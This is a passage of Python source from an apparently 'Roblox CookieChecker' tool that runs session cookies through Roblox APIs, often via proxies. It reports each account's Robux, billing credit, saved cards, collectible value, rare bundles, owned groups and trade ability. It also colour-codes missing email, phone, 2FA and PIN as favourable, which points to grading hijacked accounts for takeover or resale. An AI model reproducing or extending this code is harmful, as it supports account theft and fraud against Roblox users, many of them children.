                    checkListBadges[str(badge[1])] = {'PlaceName': rmPatternFromString(SPECIAL_CHARS, place.placeNames[0]), 'BadgeName': rmPatternFromString(SPECIAL_CHARS, badge[0])}
    for customPlace in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
        customPlaceData = config['Roblox']['CookieChecker']['CustomPlaces'][rmPatternFromString(SPECIAL_CHARS, str(customPlace))]
        if customPlaceData[2] and f'{customPlace}_Badges' in config['Roblox']['CookieChecker']['CustomPlaces'] and [badge[1] for badge in config['Roblox']['CookieChecker']['CustomPlaces'][f'{customPlace}_Badges'] if badge[2]]:
            for badge in config['Roblox']['CookieChecker']['CustomPlaces'][f'{customPlace}_Badges']:
                if badge[2]:
                    checkListBadges[str(badge[0])] = {'PlaceName': rmPatternFromString(SPECIAL_CHARS, customPlaceData[1][0]), 'BadgeName': rmPatternFromString(SPECIAL_CHARS, badge[1])}
    logger.debug(f'< [checkListBadges] > Generated: {checkListBadges}')

def createGlobalCheckListCustomGamepassesRCC() -> None: # -> dict[str, int]
    if not config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses']:
        return
    global checkListCustomGamepasses
    checkListCustomGamepasses = {customGamepass[0]: 0 for customGamepass in config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_List'] if customGamepass[1]}
    logger.debug(f'< [checkListCustomGamepasses] > Generated: {checkListCustomGamepasses}')

def createGlobalCheckListFavoritePlacesRCC() -> None: # -> dict[str, str]
    if not config['Roblox']['CookieChecker']['Main']['Favorite_Places']:
        return
    global checkListFavoritePlaces
    checkListFavoritePlaces = {str(favoritePlace[0]): rmPatternFromString(SPECIAL_CHARS, favoritePlace[1]) for favoritePlace in config['Roblox']['CookieChecker']['Main']['Favorite_Places_List'] if favoritePlace[2]}
    logger.debug(f'< [checkListFavoritePlaces] > Generated: {checkListFavoritePlaces}')

def createGlobalCheckListPlacesWeeklyPlaytime() -> None: # -> dict[str, str]
    if not config['Roblox']['CookieChecker']['Main']['Places_Weekly_Playtime']:
        return
    global checkListPlacesWeeklyPlaytime
    checkListPlacesWeeklyPlaytime = {str(place[1]): place[2] for place in config['Roblox']['CookieChecker']['Main']['Places_Weekly_Playtime_List'] if place[-1]}
    logger.debug(f'< [checkListPlacesWeeklyPlaytime] > Generated: {checkListPlacesWeeklyPlaytime}')

def createGlobalCheckListBundlesRCC() -> None: # -> dict[str, str]
    if not config['Roblox']['CookieChecker']['Main']['Bundles']:
        return
    global checkListBundles
    checkListBundles = {str(bundle[0]): rmPatternFromString(SPECIAL_CHARS, bundle[1]) for bundle in config['Roblox']['CookieChecker']['Main']['Bundles_List'] if bundle[2]}
    logger.debug(f'< [checkListBundles] > Generated: {checkListBundles}')

### Поиск данных

async def getProfileInformationRoblox(
    cookies: dict[str, str],
    userId: str,
    *components: Literal[
        'UserProfileHeader',
        'Actions',
        'About',
        'CurrentlyWearing',
        'ContentPosts',
        'Friends',
        'Collections',
        'Communities',
        'FavoriteExperiences',
        'PlayerBadges',
        'Statistics',
        'Experiences',
        'CreationsModels',
        'Clothing',
        'Store'
    ],
    proxies: Optional[list[str]]
) -> dict:
    json = {
        'components': [{'component': component} for component in components],
        'includeComponentOrdering': True,
        'profileId': userId,
        'profileType': 'User'
    }
    return await (await sendPostRequestRoblox('https://apis.roblox.com/profile-platform-api/v1/profiles/get', json=json, cookies=cookies, proxies=proxies)).json()

async def getMixedInformationRoblox(userId: int, cookies: dict[str, str], proxies: Optional[list[str]] = None) -> dict:
    configRCCMain = config['Roblox']['CookieChecker']['Main']
    components = ()
    # if configRCCMain['Place_Visits']:
    #     components += ('Statistics',)
    if any([configRCCMain['Friends'], configRCCMain['Followers'], configRCCMain['Followings']]):
        components += ('UserProfileHeader',)
    if not components:
        return {'Place Visits': None, 'Friends': None, 'Followers': None, 'Followings': None}
    response: dict = await getProfileInformationRoblox(cookies, userId, *components, proxies=proxies)
    resultsMixed = await asyncio.gather(
        # getPlaceVisitsRoblox(response),
        getFriendsRoblox(response), 
        getFollowersRoblox(response),
        getFollowingsRoblox(response)
    )
    returner = {}
    for value in resultsMixed:
        returner.update(value)
    return returner

async def getAccountInformationRoblox(cookies: dict[str, str], proxies: Optional[list[str]] = None) -> dict:
    return await sendGetRequestRoblox('https://www.roblox.com/my/settings/json', cookies=cookies, proxies=proxies)

async def getLinkRoblox(userId: int) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Link']:
        return {'Link': None}
    return {
        'Link': {
            'color': f'{ANSI.FG.CYAN}Link:{ANSI.FG.WHITE} https://www.roblox.com/users/{userId}',
            'no-color': f'Link: https://www.roblox.com/users/{userId}'
        }
    }

async def getNameRoblox(accountInformation: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Name']:
        return {'Name': None}
    name = accountInformation['Name']
    return {
        'Name': {
            'color': f'{ANSI.FG.CYAN}Name:{ANSI.FG.WHITE} {name}',
            'no-color': f'Name: {name}',
            'sort-str': name
        }
    }

async def getDisplayNameRoblox(accountInformation: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Display_Name']:
        return {'Display Name': None}
    displayName = accountInformation['DisplayName']
    return {
        'Display Name': {
            'color': f'{ANSI.FG.CYAN}Display Name:{ANSI.FG.WHITE} {displayName}',
            'no-color': f'Display Name: {displayName}',
            'sort-str': displayName
        }
    }

async def getRegistrationDateRoblox(accountInformation: dict, userId: int, cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Registration_Date_DMY']:
        return {'Registration Date': None}
    response: dict = await sendGetRequestRoblox(f'https://users.roblox.com/v1/users/{userId}', cookies=cookies, proxies=proxies)
    registrationDateDMY = convertDate(response['created'], '%d.%m.%Y')
    registrationDateInDays = accountInformation['AccountAgeInDays']
    registrationDateInDaysInBrackets = f' ({registrationDateInDays})' if config['Roblox']['CookieChecker']['Main']['Registration_Date_In_Days'] else ''
    return {
        'Registration Date': {
            'color': f'{ANSI.FG.CYAN}Reg. Date:{ANSI.FG.WHITE} {registrationDateDMY}{registrationDateInDaysInBrackets}',
            'no-color': f'Reg. Date: {registrationDateDMY}{registrationDateInDaysInBrackets}',
            'sort-str': registrationDateDMY,
            'sort-int': registrationDateInDays
        }
    }

async def getCountryRegistrationRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Country_Registration']:
        return {'Country Registration': None}
    response: dict = await sendGetRequestRoblox('https://users.roblox.com/v1/users/authenticated/country-code', cookies=cookies, proxies=proxies)
    countryRegistration = response['countryCode']
    return {
        'Country Registration': {
            'color': f'{ANSI.FG.CYAN}Country Reg.:{ANSI.FG.WHITE} {countryRegistration}',
            'no-color': f'Country Reg.: {countryRegistration}',
            'sort-str': countryRegistration
        }
    }

async def getRobuxRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Robux']:
        return {'Robux': None}
    response: dict = await sendGetRequestRoblox(f'https://economy.roblox.com/v1/users/{userId}/currency', cookies=cookies, proxies=proxies)
    robux = response['robux']
    return {
        'Robux': {
            'color': f'{ANSI.FG.CYAN}Robux: {ANSI.FG.GREEN if robux else ANSI.FG.RED}{robux}{ANSI.FG.WHITE}',
            'no-color': f'Robux: {robux}',
            'sort-int': robux
        }
    }

async def getBillingRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Billing']:
        return {'Billing': None}
    response: dict = await sendGetRequestRoblox('https://billing.roblox.com/v1/credit', cookies=cookies, proxies=proxies)
    billing = response['robuxAmount']
    return {
        'Billing': {
            'color': f'{ANSI.FG.CYAN}Billing: {ANSI.FG.GREEN if billing else ANSI.FG.RED}{billing}{ANSI.FG.WHITE}',
            'no-color': f'Billing: {billing}',
            'sort-int': billing
        }
    }

async def getTransactionsForYearRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not (config['Roblox']['CookieChecker']['Main']['Pending'] or config['Roblox']['CookieChecker']['Main']['Donate_1_Year']):
        return {'Pending': None, 'Donate (1 Year)': None}
    response: dict = await sendGetRequestRoblox(f'https://economy.roblox.com/v2/users/{userId}/transaction-totals?timeFrame=Year&transactionType=Summary', cookies=cookies, proxies=proxies)
    returner = {}
    if config['Roblox']['CookieChecker']['Main']['Pending']:
        pending = response['pendingRobuxTotal']
        returner['Pending'] = {
            'color': f'{ANSI.FG.CYAN}Pending: {ANSI.FG.GREEN if pending else ANSI.FG.RED}{pending}{ANSI.FG.WHITE}',
            'no-color': f'Pending: {pending}',
            'sort-int': pending
        }
    else:
        returner['Pending'] = None
        
    if config['Roblox']['CookieChecker']['Main']['Donate_1_Year']:
        donate1Year = abs(response['outgoingRobuxTotal'])
        returner['Donate (1 Year)'] = {
            'color': f'{ANSI.FG.CYAN}Donate (1 Year): {ANSI.FG.GREEN if donate1Year else ANSI.FG.RED}{donate1Year}{ANSI.FG.WHITE}',
            'no-color': f'Donate (1 Year): {donate1Year}',
            'sort-int': donate1Year
        }
    else:
        returner['Donate (1 Year)'] = None
        
    return returner

async def getDonateAllTimeRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None, outputMode: str = 'NameNumber') -> dict[str, Optional[dict]]:
    checkDonateAllTime = config['Roblox']['CookieChecker']['Main']['Donate_All_Time']
    checkCustomGamepasses = config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses']
    if not (checkDonateAllTime or checkCustomGamepasses):
        return {'Donate (All Time)': None, 'Custom Gamepasses': None}
    returner = {}
    donateAllTime = 0
    nextCursor = ''
    donateAllTimeMaxPages = config['Roblox']['CookieChecker']['Main']['Donate_All_Time_Max_Check_Pages']
    if checkCustomGamepasses:
        customGamepasses = copy.deepcopy(checkListCustomGamepasses)
        customGamepassesMaxPages = config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_Max_Check_Pages']
    else:
        customGamepassesMaxPages = -1
    maximumPage = max(donateAllTimeMaxPages, customGamepassesMaxPages)
    currentPage = 0
    while nextCursor is not None and currentPage != maximumPage:
        response: Optional[dict[str, dict[dict[str, str]]]] = await sendGetRequestRoblox(f'https://economy.roblox.com/v2/users/{userId}/transactions?transactionType=2&limit=100&cursor={nextCursor}', cookies=cookies, proxies=proxies)
        if response is None:
            break
            
        for transaction in response['data']:
            if checkDonateAllTime and (donateAllTimeMaxPages == -1 or currentPage < donateAllTimeMaxPages):
                donateAllTime += transaction['currency']['amount']
            if checkCustomGamepasses:
                transactionDetails: dict = transaction.get('details', {})
                transactionName = transactionDetails.get('name')
                if transactionName in checkListCustomGamepasses and (customGamepassesMaxPages == -1 or currentPage < customGamepassesMaxPages):
                    customGamepasses[transaction['details']['name']] += 1
        nextCursor = response['nextPageCursor']
        currentPage += 1

    if checkDonateAllTime:
        donateAllTime = abs(donateAllTime)
        returner['Donate (All Time)'] = {
            'color': f'{ANSI.FG.CYAN}Donate (All Time): {ANSI.FG.GREEN if donateAllTime else ANSI.FG.RED}{donateAllTime}{ANSI.FG.WHITE}',
            'no-color': f'Donate (All Time): {donateAllTime}',
            'sort-int': donateAllTime
        }
    else:
        returner['Donate (All Time)'] = None

    if checkCustomGamepasses:
        amountOfCustomGamepasses = sum(customGamepasses.values())
        color, value = [ANSI.FG.GREEN, formatCustomGamepassesOutput(customGamepasses, mode=outputMode)] if amountOfCustomGamepasses else [ANSI.FG.RED, '0']
        returner['Custom Gamepasses'] = {
            'color': f'{ANSI.FG.CYAN}Custom Gamepasses:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Custom Gamepasses: {value}',
            'sort-int': amountOfCustomGamepasses,
            'sort-list': [rmPatternFromString(SPECIAL_CHARS, name) for name, amount in customGamepasses.items() if amount]
        }
    else:
        returner['Custom Gamepasses'] = None
        
    return returner

async def getRapRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Rap']:
        return {'Rap': None}
    rap = 0
    nextCursor = ''
    maximumPage = config['Roblox']['CookieChecker']['Main']['Rap_Max_Check_Pages']
    currentPage = 0
    while nextCursor is not None and currentPage != maximumPage:
        response: dict = await sendGetRequestRoblox(f'https://inventory.roblox.com/v1/users/{userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor={nextCursor}', cookies=cookies, proxies=proxies)
        for item in response['data']:
            if item['recentAveragePrice'] is not None:
                rap += item['recentAveragePrice']
        nextCursor = response['nextPageCursor']
        currentPage += 1
    return {
        'Rap': {
            'color': f'{ANSI.FG.CYAN}Rap: {ANSI.FG.GREEN if rap else ANSI.FG.RED}{rap}{ANSI.FG.WHITE}',
            'no-color': f'Rap: {rap}',
            'sort-int': rap
        }
    }

async def getCardRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Card']:
        return {'Card': None}
    response: dict = await sendGetRequestRoblox(f'https://apis.roblox.com/payments-gateway/v1/payment-profiles', cookies=cookies, proxies=proxies)
    card = len(response)
    return {
        'Card': {
            'color': f'{ANSI.FG.CYAN}Card: {ANSI.FG.GREEN if card else ANSI.FG.RED}{card}{ANSI.FG.WHITE}',
            'no-color': f'Card: {card}',
            'sort-int': card
        }
    }

async def getPremiumRoblox(accountInformation: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Premium']:
        return {'Premium': None}
    color, value, intValue = [ANSI.FG.GREEN, 'Yes', 1] if accountInformation['IsPremium'] else [ANSI.FG.RED, 'No', 0]
    return {
        'Premium': {
            'color': f'{ANSI.FG.CYAN}Premium:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Premium: {value}',
            'sort-str': value,
            'total': intValue
        }
    }

async def getGamepassesRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None, outputMode: str = 'PlaceNames') -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Gamepasses']:
        return {'Gamepasses': None}
    gamepasses = {gamepass['PlaceName']: [] for gamepass in checkListGamepasses.values()}
    amountOfFoundGamepasses = 0
    amountOfCheckGamepasses = len(checkListGamepasses)
    nextCursor = ''
    maximumPage = config['Roblox']['CookieChecker']['Main']['Gamepasses_Max_Check_Pages']
    currentPage = 0
    while (nextCursor is not None and currentPage != maximumPage and amountOfFoundGamepasses != amountOfCheckGamepasses):
        response: dict = await sendGetRequestRoblox(f'https://apis.roblox.com/game-passes/v1/users/{userId}/game-passes?count=100&exclusiveStartId={nextCursor}', cookies=cookies, proxies=proxies)
        _gamepasses = response['gamePasses']
        if not _gamepasses:
            break
        for gamepass in _gamepasses:
            gamepassId = str(gamepass['gamePassId'])
            if gamepassId in checkListGamepasses:
                gamepasses[checkListGamepasses[gamepassId]['PlaceName']].append(checkListGamepasses[gamepassId]['GamepassName'])
                amountOfFoundGamepasses += 1
        nextCursor = None if len(_gamepasses) < 100 else gamepassId
        currentPage += 1

    color, value = [ANSI.FG.GREEN, formatNNPPOutput(gamepasses, mode=outputMode)] if amountOfFoundGamepasses else [ANSI.FG.RED, '0']
    return {
        'Gamepasses': {
            'color': f'{ANSI.FG.CYAN}Gamepasses:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Gamepasses: {value}',
            'sort-int': amountOfFoundGamepasses,
            'sort-dict': gamepasses
        }
    }

async def getBadgesRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None, outputMode: str = 'PlaceNames') -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Badges']:
        return {'Badges': None}
    badges = {badge['PlaceName']: [] for badge in checkListBadges.values()}
    amountOfFoundBadges = 0
    amountOfCheckBadges = len(checkListBadges)
    nextCursor = ''
    maximumPage = config['Roblox']['CookieChecker']['Main']['Badges_Max_Check_Pages']
    currentPage = 0
    while (nextCursor is not None and currentPage != maximumPage and amountOfFoundBadges != amountOfCheckBadges):
        response: dict = await sendGetRequestRoblox(f'https://badges.roblox.com/v1/users/{userId}/badges?limit=100&cursor={nextCursor}', cookies=cookies, proxies=proxies)
        for badge in response['data']:
            badgeId = str(badge['id'])
            if badgeId in checkListBadges:
                badges[checkListBadges[badgeId]['PlaceName']].append(checkListBadges[badgeId]['BadgeName'])
                amountOfFoundBadges += 1
        nextCursor = response['nextPageCursor']
        currentPage += 1

    color, value = [ANSI.FG.GREEN, formatNNPPOutput(badges, mode=outputMode)] if amountOfFoundBadges else [ANSI.FG.RED, '0']
    return {
        'Badges': {
            'color': f'{ANSI.FG.CYAN}Badges:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Badges: {value}',
            'sort-int': amountOfFoundBadges,
            'sort-dict': badges
        }
    }

async def getFavoritePlacesRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None, outputMode: str = 'Names') -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Favorite_Places']:
        return {'Favorite Places': None}
    favoritePlaces = []
    amountOfFoundFavoritePlaces = 0
    amountOfCheckFavoritePlaces = len(checkListFavoritePlaces)
    nextCursor = ''
    maximumPage = config['Roblox']['CookieChecker']['Main']['Favorite_Places_Max_Check_Pages']
    currentPage = 0
    while (nextCursor is not None and currentPage != maximumPage and amountOfFoundFavoritePlaces != amountOfCheckFavoritePlaces):
        response: dict = await sendGetRequestRoblox(f'https://games.roblox.com/v2/users/{userId}/favorite/games?limit=100&cursor={nextCursor}', cookies=cookies, proxies=proxies)
        for place in response['data']:
            placeId = str(place['rootPlace']['id'])
            if placeId in checkListFavoritePlaces:
                favoritePlaces.append(checkListFavoritePlaces[placeId])
                amountOfFoundFavoritePlaces += 1
        nextCursor = response['nextPageCursor']
        currentPage += 1

    color, value = [ANSI.FG.GREEN, formatNNOutput(favoritePlaces, mode=outputMode)] if amountOfFoundFavoritePlaces else [ANSI.FG.RED, '0']
    return {
        'Favorite Places': {
            'color': f'{ANSI.FG.CYAN}Fav. Places:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Fav. Places: {value}',
            'sort-int': amountOfFoundFavoritePlaces,
            'sort-list': favoritePlaces
        }
    }

async def getPlacesWeeklyPlaytimeRoblox(cookies: dict, proxies: Optional[list[str]] = None, outputMode: str = 'Names') -> dict:
    if not config['Roblox']['CookieChecker']['Main']['Places_Weekly_Playtime']:
        return {'Places Weekly Playtime': None}
    response: dict = await sendGetRequestRoblox('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-top-weekly-screentime-by-universe', cookies=cookies, proxies=proxies)
    placesWeeklyPlaytimeColor = {}
    placesWeeklyPlaytimeNoColor = {}
    for place in response['universeWeeklyScreentimes']:
        universeId = str(place['universeId'])
        if universeId in checkListPlacesWeeklyPlaytime:
            placeName = checkListPlacesWeeklyPlaytime[universeId]
            placesWeeklyPlaytimeColor[placeName] = f'{placeName} ({formatDuration(int(place['weeklyMinutes']) * 60 * 1000, outUnits=['d', 'h', 'm'])}{ANSI.FG.GREEN})'
            placesWeeklyPlaytimeNoColor[placeName] = f'{placeName} ({formatDuration(int(place['weeklyMinutes']) * 60 * 1000, inColor='', outColor='', outUnits=['d', 'h', 'm'])})'
    
    color, valueColor, valueNoColor = [
        ANSI.FG.GREEN,
        formatNNOutput(list(placesWeeklyPlaytimeColor.values()), mode=outputMode),
        formatNNOutput(list(placesWeeklyPlaytimeNoColor.values()), mode=outputMode)
    ] if placesWeeklyPlaytimeColor else [
        ANSI.FG.RED,
        'No',
        'No'
    ]
    return {
        'Places Weekly Playtime': {
            'color': f'{ANSI.FG.CYAN}Places Weekly Playtime:{color} {valueColor}{ANSI.FG.WHITE}',
            'no-color': f'Places Weekly Playtime: {valueNoColor}',
            'sort-int': len(placesWeeklyPlaytimeColor),
            'sort-list': list(placesWeeklyPlaytimeColor)
        }
    }

async def getBundlesRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None, outputMode: str = 'Names') -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Bundles']:
        return {'Bundles': None, 'Korblox': None, 'Headless': None}
    returner = {}
    bundles = {}
    amountOfFoundBundles = 0
    amountOfCheckBundles = len(checkListBundles)
    nextCursor = ''
    maximumPage = config['Roblox']['CookieChecker']['Main']['Bundles_Max_Check_Pages']
    currentPage = 0
    while nextCursor is not None and currentPage != maximumPage and amountOfFoundBundles != amountOfCheckBundles:
        response: dict = await sendGetRequestRoblox(f'https://catalog.roblox.com/v1/users/{userId}/bundles/1?limit=100&cursor={nextCursor}', cookies=cookies, proxies=proxies)
        for bundle in response['data']:
            bundleId = str(bundle['id'])
            if bundleId in checkListBundles:
                bundles[bundleId] = checkListBundles[bundleId]
                amountOfFoundBundles += 1
        nextCursor = response['nextPageCursor']
        currentPage += 1

    bundlesNames = list(bundles.values())
    color, value = [ANSI.FG.GREEN, formatNNOutput(bundlesNames, mode=outputMode)] if amountOfFoundBundles else [ANSI.FG.RED, '0']
    returner.update({
        'Bundles': {
            'color': f'{ANSI.FG.CYAN}Bundles:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Bundles: {value}',
            'sort-int': amountOfFoundBundles,
            'sort-dict': bundlesNames
        }
    })
    
    if '192' in checkListBundles:
        color, value, boolean = [ANSI.FG.GREEN, 'Yes', True] if '192' in bundles else [ANSI.FG.RED, 'No', False]
        returner.update({
            'Korblox': {
                'color': f'{ANSI.FG.CYAN}Korblox:{color} {value}{ANSI.FG.WHITE}',
                'no-color': f'Korblox: {value}',
                'sort-str': value,
                'total': boolean
            }
        })
    else:
        returner.update({'Korblox': None})
        
    if '201' in checkListBundles:
        color, value, boolean = [ANSI.FG.GREEN, 'Yes', True] if '201' in bundles else [ANSI.FG.RED, 'No', False]
        returner.update({
            'Headless': {
                'color': f'{ANSI.FG.CYAN}Headless:{color} {value}{ANSI.FG.WHITE}',
                'no-color': f'Headless: {value}',
                'sort-str': value,
                'total': boolean
            }
        })
    else:
        returner.update({'Headless': None})
        
    return returner

async def getInventoryPrivacyRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Inventory_Privacy']:
        return {'Inventory Privacy': None}
    response: dict = await sendGetRequestRoblox('https://apis.roblox.com/user-settings-api/v1/user-settings/settings-and-options', cookies=cookies, proxies=proxies)
    privacy = response['whoCanSeeMyInventory']['currentValue']
    color, value = ([ANSI.FG.GREEN,  'Everyone']                         if privacy == 'AllUsers'
               else [ANSI.FG.YELLOW, 'Friends & Followers & Followings'] if privacy == 'FriendsFollowingAndFollowers'
               else [ANSI.FG.YELLOW, 'Friends & Followings']             if privacy == 'FriendsAndFollowing'
               else [ANSI.FG.YELLOW, 'Friends']                          if privacy == 'Friends'
               else [ANSI.FG.RED,    'No One'])
    return {
        'Inventory Privacy': {
            'color': f'{ANSI.FG.CYAN}Inv. Privacy:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Inv. Privacy: {value}',
            'sort-str': value
        }
    }

async def getTradePrivacyRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Trade_Privacy']:
        return {'Trade Privacy': None}
    response: dict = await sendGetRequestRoblox('https://accountsettings.roblox.com/v1/trade-privacy', cookies=cookies, proxies=proxies)
    privacy = response['tradePrivacy']
    color, value = ([ANSI.FG.GREEN,  'Everyone']                         if privacy == 'AllUsers'
               else [ANSI.FG.YELLOW, 'Friends & Followers & Followings'] if privacy == 'FriendsFollowingAndFollowers'
               else [ANSI.FG.YELLOW, 'Friends & Followings']             if privacy == 'FriendsAndFollowing'
               else [ANSI.FG.YELLOW, 'Friends']                          if privacy == 'Friends'
               else [ANSI.FG.RED,    'No One'])
    return {
        'Trade Privacy': {
            'color': f'{ANSI.FG.CYAN}Trade Privacy:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Trade Privacy: {value}',
            'sort-str': value
        }
    }

async def getCanTradeRoblox(accountInformation: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Can_Trade']:
        return {'Can Trade': None}
    color, value = [ANSI.FG.GREEN, 'Yes'] if accountInformation['CanTrade'] else [ANSI.FG.RED, 'No']
    return {
        'Can Trade': {
            'color': f'{ANSI.FG.CYAN}Can Trade:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Can Trade: {value}',
            'sort-str': value
        }
    }

async def getSessionsRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Sessions']:
        return {'Sessions': None}
    sessions = 0
    nextCursor = ''
    maximumPage = config['Roblox']['CookieChecker']['Main']['Sessions_Max_Check_Pages']
    currentPage = 0
    while (nextCursor is not None and currentPage != maximumPage):
        response: dict = await sendGetRequestRoblox(f'https://apis.roblox.com/token-metadata-service/v1/sessions?nextCursor={nextCursor}', cookies=cookies, proxies=proxies)
        sessions += len(response['sessions'])
        nextCursor = response['nextCursor']
        currentPage += 1

    color = (ANSI.FG.RED    if sessions >= 10
        else ANSI.FG.YELLOW if sessions >= 5
        else ANSI.FG.GREEN)
    return {
        'Sessions': {
            'color': f'{ANSI.FG.CYAN}Sessions:{color} {sessions}{ANSI.FG.WHITE}',
            'no-color': f'Sessions: {sessions}',
            'sort-int': sessions
        }
    }

async def getEmailRoblox(accountInformation: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Email']:
        return {'Email': None}
    securityModel   = accountInformation['MyAccountSecurityModel']
    isEmailSetted   = securityModel['IsEmailSet']
    isEmailVerified = securityModel['IsEmailVerified']
    color, value = ([ANSI.FG.GREEN,  'No']  if not isEmailSetted
               else [ANSI.FG.RED,    'Yes'] if isEmailSetted and isEmailVerified
               else [ANSI.FG.YELLOW, 'Setted'])
    return {
        'Email': {
            'color': f'{ANSI.FG.CYAN}Email:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Email: {value}',
            'sort-str': value
        }
    }

async def getPhoneRoblox(cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Phone']:
        return {'Phone': None}
    response: dict = await sendGetRequestRoblox('https://accountinformation.roblox.com/v1/phone', cookies=cookies, proxies=proxies)
    color, value = [ANSI.FG.RED, 'Yes'] if response['phone'] else [ANSI.FG.GREEN, 'No']
    return {
        'Phone': {
            'color': f'{ANSI.FG.CYAN}Phone:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Phone: {value}',
            'sort-str': value
        }
    }

async def get2FARoblox(accountInformation: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['2FA']:
        return {'2FA': None}
    color, value = [ANSI.FG.RED, 'Yes'] if accountInformation['MyAccountSecurityModel']['IsTwoStepEnabled'] else [ANSI.FG.GREEN, 'No']
    return {
        '2FA': {
            'color': f'{ANSI.FG.CYAN}2FA:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'2FA: {value}',
            'sort-str': value
        }
    }

async def getPinRoblox(accountInformation: dict) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Pin']:
        return {'Pin': None}
    color, value = [ANSI.FG.RED, 'Yes'] if accountInformation['IsAccountPinEnabled'] else [ANSI.FG.GREEN, 'No']
    return {
        'Pin': {
            'color': f'{ANSI.FG.CYAN}Pin:{color} {value}{ANSI.FG.WHITE}',
            'no-color': f'Pin: {value}',
            'sort-str': value
        }
    }

async def getGroupsInformationRoblox(userId: int, cookies: dict, proxies: Optional[list[str]] = None, outputMode: str = 'Names') -> dict[str, Optional[dict]]:
    configRCCMain = config['Roblox']['CookieChecker']['Main']
    if not (configRCCMain['Groups_Owned'] or configRCCMain['Groups_Members'] or configRCCMain['Groups_Pending'] or configRCCMain['Groups_Funds']):
        return {'Groups Owned': None, 'Groups Members': None, 'Groups Pending': None, 'Groups Funds': None}
    response: dict = await sendGetRequestRoblox(f'https://groups.roblox.com/v1/users/{userId}/groups/roles?includeLocked=true', cookies=cookies, proxies=proxies)
    returner = {}
    groupsOwned = {}
    groupsMembers = 0
    for group in response['data']:
        if group['role']['rank'] == 255:
            groupsOwned[rmPatternFromString(SPECIAL_CHARS, group['group']['name'])] = group['group']['id']
            groupsMembers += group['group']['memberCount']

    color, value = [ANSI.FG.GREEN, formatNNOutput(groupsOwned, mode=outputMode)] if groupsOwned else [ANSI.FG.RED, '0']
    returner.update(
        {
            'Groups Owned': {
                'color': f'{ANSI.FG.CYAN}G. Owned:{color} {value}{ANSI.FG.WHITE}',
                'no-color': f'G. Owned: {value}',
                'sort-int': len(groupsOwned),
                'sort-list': list(groupsOwned)
            }
        } if configRCCMain['Groups_Owned'] else {'Groups Owned': None}
    )

    returner.update(
        {
            'Groups Members': {
                'color': f'{ANSI.FG.CYAN}G. Members:{color} {groupsMembers}{ANSI.FG.WHITE}',
                'no-color': f'G. Members: {groupsMembers}',
                'sort-int': groupsMembers
            }
        } if configRCCMain['Groups_Members'] else {'Groups Members': None}
    )

    groupsIds = list(groupsOwned.values())
    groupsPending, groupsFunds = await asyncio.gather(
        getGroupsPendingRoblox(groupsIds, cookies, proxies),
        getGroupsFundsRoblox(  groupsIds, cookies, proxies)
    )
    returner.update(groupsPending)
    returner.update(groupsFunds)

    return returner

async def getGroupsPendingRoblox(groupsIds: list[str], cookies: dict, proxies: Optional[list[str]] = None) -> dict[str, Optional[dict]]:
    if not config['Roblox']['CookieChecker']['Main']['Groups_Pending']:
        return {'Groups Pending': None}
    groupsPending = 0
